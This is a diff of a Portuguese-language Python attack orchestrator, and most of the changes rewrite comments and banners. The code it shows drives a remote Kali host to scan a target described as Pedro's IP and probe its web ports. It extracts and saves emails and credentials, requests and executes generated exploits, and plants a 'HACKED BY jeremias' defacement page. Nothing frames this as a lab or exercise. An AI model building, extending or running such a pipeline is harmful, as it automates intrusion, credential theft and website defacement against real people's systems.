@@ -11,12 +11,12 @@ import subprocess
 # Bridges
 from bridge_re import pe_analise, detecta_packer, tira_strings
 
-# ========== CONFIG ==========
+# configuraçao
 KALI_IP = "100.99.121.111"
 PORTA_SCAN = 9999
 PORTA_WEB = 9998
 
-# ========== DETETAR KALIS ==========
+#  Detetar o kali 
 
 def deteta_kali_scan():
     try:
@@ -50,7 +50,7 @@ def deteta_kali_web():
     print("[!] Kali Web nao encontrado. Testes web vao falhar.")
     return False
 
-# ========== COMUNICAR COM KALIS ==========
+#  comunicar com o kali 
 
 def manda_kali_scan(cmd):
     try:
@@ -117,7 +117,7 @@ def envia_malware(caminho):
     except Exception as e:
         return f"ERRO: {e}"
 
-# ========== FUNÇÕES DE DESCOBERTA INTELIGENTE ==========
+# descobre as coisas sozinho de forma intelegente
 
 def pesca_ips_com_contexto(texto):
     resultados = []
@@ -201,11 +201,10 @@ def interpreta_scan(texto):
                 portas.append(partes[0].strip())
     return portas
 
+# identifica as portas web em tempo re testa cada porta para ver se é HTTP/HTTPS
+    
 def identifica_portas_web(texto, portas):
-    """
-    IDENTIFICA PORTAS WEB EM TEMPO REAL
-    Testa cada porta para ver se é HTTP/HTTPS
-    """
+   
     portas_web = []
     
     for porta in portas:
@@ -248,7 +247,7 @@ def identifica_portas_web(texto, portas):
     
     return portas_web
 
-# ========== FUNÇÕES DE ROUBO E DEFACE ==========
+#  funçoes que ele deve roubar 
 
 def extrai_dados_sensiveis(texto):
     dados = {
@@ -283,9 +282,9 @@ def gera_deface(ip, porta):
     
     html = f'''<!DOCTYPE html>
 <html>
-<head><title>HACKED BY JEREMIAS</title></head>
+<head><title>HACKED BY jeremias</title></head>
 <body style="background:black;color:red;font-family:monospace;text-align:center;padding-top:20%;">
-<h1>HACKED BY JEREMIAS</h1>
+<h1>HACKED BY jeremias</h1>
 <p>O site do Pedro foi comprometido!</p>
 <p>IP: {ip}:{porta}</p>
 <p>DATA: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
@@ -305,11 +304,11 @@ def aplica_deface(ip, porta, deface_file):
         f.write(f"DATA: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
     return True
 
-# ========== FUNÇÃO PRINCIPAL ==========
+#  funçao principal 
 
 def ataca_tudo():
     print("\n" + "="*60)
-    print(" ORQUESTRADOR INTELIGENTE - ZERO FIXO")
+    print(" ORQUESTRADOR INTELIGENTE")
     print("="*60)
     
     scan_ok = deteta_kali_scan()
@@ -324,9 +323,9 @@ def ataca_tudo():
         print("[!] Ficheiro nao existe!")
         return
     
-    # ===== FASE 1: RE LOCAL =====
+    #re local 
     print("\n" + "-"*50)
-    print("FASE 1: RE LOCAL")
+    print("re: RE LOCAL")
     print("-"*50)
     
     print("[*] A analisar...")
@@ -348,9 +347,9 @@ def ataca_tudo():
     for s in strings.get("strings", [])[:8]:
         print(f"    -> {s[:80]}")
     
-    # ===== FASE 2: PESCAR IPS COM CONTEXTO =====
+    #pesca os ips com contexo 
     print("\n" + "-"*50)
-    print("FASE 2: PESCAR IPS COM CONTEXTO")
+    print("ip: PESCA IPS COM CONTEXTO")
     print("-"*50)
     
     texto_total = " ".join(strings.get("strings", []))
@@ -364,9 +363,9 @@ def ataca_tudo():
     
     mostra_contexto_ips(ips_com_contexto)
     
-    # ===== FASE 3: IDENTIFICAR IP DO PEDRO =====
+    #identifica o ip do kali do pedro  
     print("\n" + "-"*50)
-    print("FASE 3: IDENTIFICAR IP DO PEDRO")
+    print("ip: IDENTIFICAR IP DO PEDRO")
     print("-"*50)
     
     ip_alvo = identifica_ip_do_pedro(ips_com_contexto)
@@ -387,9 +386,9 @@ def ataca_tudo():
             print("[*] A sair...")
             return
     
-    # ===== FASE 4: SCAN =====
+    #SCAN 
     print("\n" + "-"*50)
-    print("FASE 4: SCAN AO IP")
+    print("scan: SCAN AO IP")
     print("-"*50)
     
     print(f"\n[*] A escanear {ip_alvo}...")
@@ -403,9 +402,9 @@ def ataca_tudo():
     
     print(f"\n[*] Portas abertas encontradas: {', '.join(portas)}")
     
-    # ===== FASE 5: IDENTIFICAR PORTAS WEB EM TEMPO REAL =====
+    # identifica portas web 
     print("\n" + "-"*50)
-    print("FASE 5: IDENTIFICAR PORTAS WEB")
+    print("scan: IDENTIFICAR PORTAS WEB")
     print("-"*50)
     
     print("[*] A testar portas para identificar web...")
@@ -426,9 +425,9 @@ def ataca_tudo():
         print("[*] A sair...")
         return
     
-    # ===== FASE 6: TESTE WEB =====
+    # TESTE WEB 
     print("\n" + "-"*50)
-    print("FASE 6: TESTE WEB")
+    print("web: TESTE WEB")
     print("-"*50)
     
     todas_vulns = []
@@ -456,10 +455,10 @@ def ataca_tudo():
             todos_dados["credenciais"].extend(dados["credenciais"])
             print(f"[*] Credenciais: {', '.join(dados['credenciais'])}")
     
-    # ===== FASE 7: ROUBAR DADOS =====
+    #rouba dados
     if todos_dados["emails"] or todos_dados["credenciais"]:
         print("\n" + "-"*50)
-        print("FASE 7: ROUBAR DADOS")
+        print("scam: ROUBAR DADOS")
         print("-"*50)
         
         print("\n[*] Dados sensíveis encontrados:")
@@ -473,10 +472,10 @@ def ataca_tudo():
             guarda_dados_roubados(ip_alvo, todos_dados)
             print("\n[+] DADOS GUARDADOS EM alvos.txt")
     
-    # ===== FASE 8: EXPLOITS =====
+    #gera os exploits com base no que encontra
     if todas_vulns:
         print("\n" + "-"*50)
-        print("FASE 8: GERAR EXPLOITS")
+        print("exp: GERAR EXPLOITS")
         print("-"*50)
         
         print(f"\n[*] Vulnerabilidades: {len(todas_vulns)}")
@@ -500,9 +499,9 @@ def ataca_tudo():
                 resultado_exploit = manda_kali_scan(f"gerar_exploit {ip_alvo} {porta_web_real} {tipo}")
                 print(f"[Kali] {resultado_exploit}")
         
-        # ===== FASE 9: EXECUTAR =====
+        #executar
         print("\n" + "-"*50)
-        print("FASE 9: EXECUTAR ATAQUE")
+        print("exe: EXECUTAR ATAQUE")
         print("-"*50)
         
         print("\n[*] ATENCAO: Vai comprometer o alvo!")
@@ -525,7 +524,7 @@ def ataca_tudo():
                 for v in todas_vulns:
                     f.write(f"  - {v}\n")
     
-    # ===== FIM =====
+    
     print("\n" + "="*60)
     print(" MISSAO CONCLUIDA!")
     print("="*60)
@@ -538,17 +537,17 @@ def ataca_tudo():
         print(f"[*] Dados roubados: {len(todos_dados['emails'])} emails, {len(todos_dados['credenciais'])} credenciais")
     print("[*] Relatorio: alvos.txt")
 
-# ========== MENU ==========
+#menu
 
 def limpa():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def menu():
     print("="*50)
-    print(" LOADER OFENSIVO")
+    print(" LOADER")
     print("="*50)
     print()
-    print("  1. ATACAR (descobre tudo sozinho)")
+    print("  1. atacar descobre tudo sozinho")
     print("  2. Analisar local")
     print("  3. Scan manual")
     print("  4. Web manual")
